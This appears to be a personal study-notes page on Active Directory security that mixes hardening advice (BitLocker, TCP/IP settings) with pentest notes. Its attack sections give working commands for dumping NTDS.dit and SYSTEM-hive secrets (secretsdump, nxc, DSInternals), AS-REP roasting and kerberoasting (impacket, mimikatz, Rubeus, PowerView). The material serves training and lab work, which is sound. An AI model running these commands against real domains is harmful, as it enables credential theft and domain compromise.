# Active Directory Security

<div class="row row-cols-lg-2"><div>

**Common good practices**

* 🔒 An account inside the Domain Admins group should be used instead of the Administrator account which should be disabled.
* 🔑 Limit the use of administrative accounts
* 🗺️ Do not name your server after its function <small>(i.g. SQL_SERVER)</small>
* 🌍 Do not name a workstation after its business unit <small>(i.g. sales-xxx)</small>
* 🏠 Do not use easy to guess usernames <small>(i.g. firstname.lastname)</small>
* 🪺 Add the fewest services on your DC <small>(i.g. no ISS/WSUS...)</small>
</div><div>

* 🏄‍♂️ Install the least ISS modules
* 🛡️ Use a strong password policy

</div></div>

<hr class="sep-both">

## Authentication & Authorization

<div class="row row-cols-lg-2"><div>

#### Active Directory database

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Active directory database is stored on the domain controller at `%SystemRoot%\ntds\ntds.dit`. It's used to validate credentials.

It contains user/computer/group accounts, group policies, etc.

To copy this database, we either need local administrative or domain administrative privileges. We can use [VSS](/operating-systems/windows/security/index.md#volume-shadow-copy-service-vss).

You can use commands that are only available on Windows Server:

```shell!
CMD> vssadmin CREATE SHADOW /For=C:
CMD> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit %temp%\NTDS.dit
```

You can also use [cme](/cybersecurity/red-team/tools/cracking/auth/cme.md)/[nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md) which automatically dump it:

```ps
$ nxc smb IP -u 'username' -p 'password' --ntds
```
</div><div>

#### Kerberos

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Kerberos is a protocol used to provide secure authentication over non-secure networks. It replaces NTLM and NetNTLM.

**Port(s)** 🐲: 88 <small>(TCP)</small>

When a user logs in, their password is hashed and sent to Kerberos server along with the timestamp for verification. Upon successful login, the server generates a **ticket-granting ticket (TGT)** 🎫.

When the user wants to access a network resource, such as a shared folder or a database, the computer requests a ticket from the Key Distribution Center (KDC) using the TGT. If the request is accepted, the KDC will give them a **Ticket Granting Service (TGS)** 🎟️ that they can use solely for the requested service.

```ps
PS> klist # list current tickets available
```
</div></div>

<hr class="sep-both">

## AD Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

According to our current situation, the techniques we use differ:

* 🐲 We are running Windows or Linux
* 🔐 We are connected to the internal network or not
* 🏘️ Our foothold is connected to AD or not

📚 We often find the Domain Controller IP and use it as the target of every other request, such as SMB requests, etc.

<br>

#### Pentester — External Access

[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

* If we have an access, anonymous or not, to [SMB](/operating-systems/networking/protocols/smb.md), we may find the domain name or expose the [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md).

* We can perform a [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) attack.

<br>

#### Pentester — LDAP access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

In an [LDAP](/operating-systems/networking/protocols/ldap.md) environment such as Active Directory, we can use:

```ps
$ ldapsearch -h IP -x -b "dc=example,dc=com" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
$ ldapsearch -h IP -x -b "dc=example,dc=com" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
$ python windapsearch.py --dc-ip IP -u "" -U
```
</div><div>

#### Pentester — Kerberos access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

* We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md) to enumerate users:

```ps
$ kerbrute userenum -d domain --dc IP wordlist
```

* We can perform a [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) attack.

* We can perform a [kerberoasting attack](#kerberoasting--privilege-escalation) <small>(credentials required 🔑)</small>

* We can perform a [ASReproasting attack](#as-rep-roasting-attack--privilege-escalation) <small>(credentials required? 🔑)</small>

<br>

#### Pentester — Internal access

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

We should be able to exploit every other technique and:

* [Passive Internal Network Discovery](/cybersecurity/red-team/s1.investigation/techniques/passive_network_discovery.md): find hosts
* [LLMNR/NBT-NS Poisoning](/cybersecurity/red-team/s2.discovery/techniques/network/poisoning.md): attack to expose credentials
* [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md): expose the password policy <small>(more commands)</small>
* [Windows Identification](/cybersecurity/red-team/s4.privesc/windows/utils/id.md): use built-in tools and functions of Windows or well-known scripts to find information.

You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect and analyze information to find attack vectors and attack paths.
</div></div>

<hr class="sep-both">

## AD Pentester Attack Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Dump Secrets From Active Directory database

[![windows_privilege_escalation](../../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
[![windows_ntds_secret_extraction](../../../../cybersecurity/_badges/rootme/forensic/windows_ntds_secret_extraction.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-NTDS-Secret-extraction)

The active directory, similarly to the SAM database, is partially encrypted using a [bootkey](/operating-systems/windows/security/index.md#syskey-bootkey-and-system-hive) stored in the SYSTEM registry.

You can [dump the SYSTEM registry hive](/operating-systems/windows/security/index.md#dump-credentials-from-the-sam-database) using:

```shell!
PS> reg save hklm\system C:\XXX\system.hive
```

You can use impacket [secretsdump](/operating-systems/networking/protocols/tools/impacket.md#secretsdump) script to dump its contents.

```shell!
$ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL -outputfile cracked
$ grep "krbtgt" cracked.ntds.kerberos # kerberos tickets
```

You could also do it remotely:

```shell!
$ impacket-secretsdump -dc-ip IP -just-dc sdomain/username:password@IP
```

You could also use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐)</small>:

```ps
PS> Import-Module .\DSInternals.psd1
PS> $key = Get-BootKey -SystemHiveFilePath '.\system.hive'
PS> Get-ADDBAccount -All -DatabasePath .\ntds.dit -BootKey $key
```

You can use [NtdsAudit](https://github.com/dionach/NtdsAudit) <small>(0.4k ⭐)</small> on Windows or [DPAT](https://github.com/clr2of8/DPAT) <small>(0.9k ⭐, 2022 🪦)</small> Python Script for statistics.

<br>

#### AS-REP Roasting Attack — Privilege Escalation

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

*Alternative name: ASReproasting*

Some kerberos users may have been configured to not require Kerberos Pre Auth, leading to their hash being sent when an authentication request is made before providing valid identification.

While I am not sure, it seems the example below is possible because guest access was enabled, so credentials were not required:

```shell!
$ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
```

Refer to [cracking Kerberos Pre Auth Hash](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-pre-auth-cracking).
</div><div>

#### Kerberoasting — Privilege Escalation

[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

Domain accounts are often used to run services. They may have been given many privileges. Each service instance is associated with a service account using a **Service Principal Names (SPN)**.

We can request a TGS for the target service, and attempt to crack its hash. RC4 hashes are easy to crack while AES hashes are harder.

We can use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md), [Rubeus](/cybersecurity/red-team/tools/utilities/creds/rubeus.md) or [PowerView](/cybersecurity/red-team/tools/utilities/windows/powersploit.md) to fetch TGS tickets.

```shell!
$ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
```

```shell!
PS> setspn.exe -Q */* # list all (ignore computer accounts)
PS> setspn.exe -T domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } # get TGS for all
```

```shell!
mimikatz> kerberos::ask /target:cn # request TGS for cn
mimikatz> base64 /out:true
mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
```

```shell!
PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
PS> Get-DomainUser cn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes # encryption scheme
PS> Get-DomainUser -Identity cn | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
```

```shell!
PS> .\Rubeus.exe kerberoast /stats # number of SPNs, encryption types
PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
PS> .\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap # try a downgrade attack
```

Some tools can try to perform a downgrade attack from AES to RC4. It won't work as of Windows Server 2019.

Refer to [cracking Kerberos Tickets](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-tickets-cracking).

📚 Refer to "Managed Service Accounts" for remediation (LAPS).

📚 More tools: [kerberoast](https://github.com/nidem/kerberoast) <small>(1.3k ⭐)</small>, [RiskySPN](https://github.com/cyberark/RiskySPN) <small>(0.3k ⭐)</small>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* prevent access to dangerous websites
* [adPEAS](https://github.com/61106960/adPEAS) (0.4k ⭐)
* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) (1.5k ⭐)
* [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) (3.4k ⭐)
* [AD mindmap orange](https://orange-cyberdefense.github.io/ocd-mindmaps/)
</div><div>

* Hardening AD ([ref](https://blog.netwrix.fr/2019/05/06/securiser-votre-annuaire-ad-contre-les-attaques-de-malware/))
* [Hacking Active Directory](https://tryhackme.com/module/hacking-active-directory)
* `\\<domain_controller>\NETLOGON` (share, store logon scripts/...)
* [kerberos/AD cyber](https://zer1t0.gitlab.io/posts/)

<details class="details-n">
<summary>Configure BitLocker</summary>

* Also in Windows Security
* Network Unlock

**1)** The first part is installing BitLocker on the server:

* Start the Server Manager
* Click on "Add roles and features"
* Press Next thrice
* In Features, select BitLocker

**2)** Then we need to configure it:

* Go to Tools > Group Policy Management
* Right-click on a GPO > Edit <small>(you could create a GPO and apply it on the whole domain, or a GPO only for some OUs...)</small>
* Navigate to "Computer Configuration" > "Policies" > "Administrative Templates" > "Windows Components" > "BitLocker Drive Encryption"
* ~~Enable the "Turn on BitLocker"~~
* Go Navigate to "Operating system drives"
* Enable the "Require additional authentication at startup"
    * Select "Allow BitLocker without a compatible TPM"
    * Select "Do not allow startup PIN with TPM"
* Enable "Choose how BitLocker-protected operating system drives can be recovered"
    * Select the "Save BitLocker recovery information to AD DS for operating system drives"
* Navigate back to parent
* ~~Configure "Choose drive encryption method and cipher strength" <small>(encryption method, cipher strength...)</small>~~

**3)** On the Windows 10, you need to use a local administrator account, refer to the "Get started" section if needed.

* Open a powershell/CMD as an administrator
* Enter "gpedit.msc"
* Navigate to "Computer Configuration" > "Administrative Templates" > "Windows Components" > "BitLocker Drive Encryption"
* ...
* Restart

Then, right-click on the drive to encrypt, select "Bitlocker", and encrypt it. If prompted for a password when starting the workstation, then something went wrong in your configuration.
</details>

<details class="details-n">
<summary>Notes to configure TCP/IP parameters</summary>

You can either use the Windows Registry, or a group policy. Here are some parameters that you may want to set.

* SynAttackProtect <small>(SYN flood attacks)</small>
* EnableDeadGWDetect <small>(Detect dead gateways)</small>
* EnablePMTUdiscovery <small>(Avoid fragmentation...)</small>
* KeepAliveTime <small>(Timeout for inactive connections)</small>
* TCPMaxPortsExhausted <small>(Prevent from exhausting ports)</small>
* PerformRouterDiscovery <small>(Can simply the configuration but allow attackers to set up rogue routers/... to redirect traffic)</small>
* NoNameReleaseOnDemand <small>(Release the NetBios name when no longer needed to prevent attacker from obtaining information)</small>
* TcpMaxConnectResponseRetransmissions <small>(can help to prevent SYN flood attacks, but may exhaust system resources)</small>
</details>

* Passwords stored in cleartext in group policy? in user desc?
</div></div>